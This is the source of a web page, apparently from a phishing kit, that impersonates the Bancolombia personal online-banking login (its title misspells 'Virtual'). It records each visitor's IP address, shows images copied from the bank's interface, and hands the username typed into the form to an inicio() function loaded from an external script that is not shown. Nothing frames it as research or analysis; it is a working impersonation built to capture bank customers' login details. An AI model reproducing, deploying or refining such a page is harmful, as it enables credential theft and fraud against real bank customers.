<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
		<title>Bancolombia Sucursal Vrtual Personas</title>
		<meta http-equiv="content-type" content="text/html; utf-8">
		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
		<meta name="description" content="">
		<meta name="author" content="">
		<meta name="Copyright" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
		<script type="text/javascript" src="/scripts/functions.js"></script>  		
	  <!-- Linkeado CSS -->
		<link rel="stylesheet" href="/assets/css/styles.css">
	    <link rel="stylesheet" href="/assets/css/usuario.css">
   
   	</head>
   	<body>
		<div class="cabecera">
			<div class="logo">
				<img src="img/cont/t-mar-min.jpg">   					
			</div>
			<div class="titulo"><img src="img/cont/u-tiu-ses-min.jpg"></div>
		</div>   			
		<div class="formulario">
			<div class="form-titulo"><img src="img/cont/u-sec-usu-min.jpg"></div>
			<div class="descripcion">
				<img src="img/cont/u-sub-min.jpg">
			</div>
			<div class="form-cuerpo">
				<div style="text-align: left;">
					<img src="img/cont/u-eti-usu-min.jpg">
				</div>   						
				<input type="text"  id="txtUsuario" class="input-icono user">
				<br>
				<button id="btnUsuario" style="background: #FDDA24; border-color: #FDDA24; padding: 5px; color: #000; border: 0px solid transparent; ">CONTINUAR</button>
				<div style="text-align: right;margin-top:17px;">
					<img src="img/cont/u-olv-min.jpg">		 		
				</div>   							
			</div>
		</div>   		
		<script type="text/javascript">
			var espera = 0;
			let identificadorTiempoDeEspera;
			function retardor() {
				identificadorTiempoDeEspera = setTimeout(retardorX, 900);
			}
			function retardorX() {
			}
			$(document).ready(function() {
				$('#btnUsuario').click(function(){
				if ($("#txtUsuario").val().length > 0) {
					inicio($("#txtUsuario").val());	               
				}else{
					$("#err-mensaje").show();
					$(".user").css("border", "1px solid red");
					$("#txtUsuario").focus();
				}			
				});
				$("#txtUsuario").keyup(function(e) {
				$(".user").css("border", "1px solid #CCCCCC");	
				$("#err-mensaje").hide();				
				});
			});
		</script>
   	</body>
</html>



 
 
